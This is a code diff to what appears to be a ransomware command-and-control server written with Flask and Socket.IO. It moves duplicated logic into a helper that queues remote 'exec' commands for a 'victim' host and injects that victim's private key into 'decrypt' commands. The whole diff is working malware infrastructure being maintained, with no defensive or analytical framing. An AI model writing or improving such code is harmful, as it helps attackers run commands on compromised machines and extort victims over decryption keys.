@@ -622,29 +622,31 @@ def _inject_private_key(hostname: str, params: dict) -> dict:
     return params
 
 
+def _queue_command(hostname: str, command: str, params: dict) -> dict:
+    """Validate and queue a command for a victim. Returns dict with 'error' or None on success."""
+    if not hostname:
+        return {'error': 'no hostname'}
+    if command == 'exec':
+        cmd_value = params.get('cmd', '')
+        if any(d in cmd_value.lower() for d in DANGEROUS_PATTERNS):
+            return {'error': 'command blocked'}
+    if command == 'decrypt':
+        params = _inject_private_key(hostname, params)
+    with commands_lock:
+        pending_commands[hostname] = {'command': command, 'params': params}
+    logger.info("Queued %s for %s", command, hostname)
+    return {}
+
+
 @app.route('/send_command', methods=['POST'])
 def send_command():
     data = request.json
     hostname = data.get('hostname')
-    if not hostname:
-        return jsonify({'error': 'no hostname'}), 400
-
     command = data.get('command', '')
-    if command == 'exec':
-        cmd_value = data.get('params', {}).get('cmd', '')
-        if any(d in cmd_value.lower() for d in DANGEROUS_PATTERNS):
-            return jsonify({'error': 'command blocked'}), 403
-
     params = data.get('params', {})
-    if command == 'decrypt':
-        params = _inject_private_key(hostname, params)
-
-    with commands_lock:
-        pending_commands[hostname] = {
-            'command': command,
-            'params': params,
-        }
-    logger.info("Queued %s for %s", command, hostname)
+    result = _queue_command(hostname, command, params)
+    if 'error' in result:
+        return jsonify(result), 403
     return jsonify({'status': 'ok'})
 
 
@@ -701,23 +703,10 @@ def handle_send_command(data):
     hostname = data.get('hostname')
     command = data.get('command', '')
     params = data.get('params', {})
-
-    if not hostname:
-        emit('command_sent', {'error': 'no hostname'})
+    result = _queue_command(hostname, command, params)
+    if 'error' in result:
+        emit('command_sent', result)
         return
-
-    if command == 'exec':
-        cmd_value = params.get('cmd', '')
-        if any(d in cmd_value.lower() for d in DANGEROUS_PATTERNS):
-            emit('command_sent', {'error': 'command blocked'})
-            return
-
-    if command == 'decrypt':
-        params = _inject_private_key(hostname, params)
-
-    with commands_lock:
-        pending_commands[hostname] = {'command': command, 'params': params}
-    logger.info("Socket queued %s for %s", command, hostname)
     emit('command_sent', {'status': 'ok', 'hostname': hostname, 'command': command})
 
 
